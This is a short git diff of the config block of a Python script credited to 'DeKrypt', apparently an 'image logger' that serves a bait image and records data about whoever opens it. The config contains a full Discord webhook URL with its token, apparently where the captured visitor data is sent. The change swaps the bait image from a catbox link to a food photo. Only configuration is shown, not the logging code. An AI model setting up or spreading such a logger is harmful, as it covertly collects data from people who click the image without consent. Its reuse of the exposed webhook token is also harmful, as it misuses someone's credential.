@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335737555726897214/HXNZiSz7pjQbmhtVhRwSAoHbUAII8YxUFL4-C6MtXg5TzuFr1BEyfBojkDaCZfkFEezC",
-    "image": "https://files.catbox.moe/rjimss.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://images.squarespace-cdn.com/content/5de60a013fbbc6593af3d390/1677053466313-X96LLE1Q8VAKHX7ABXVJ/BUMI_Indian+Seitan_TC.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
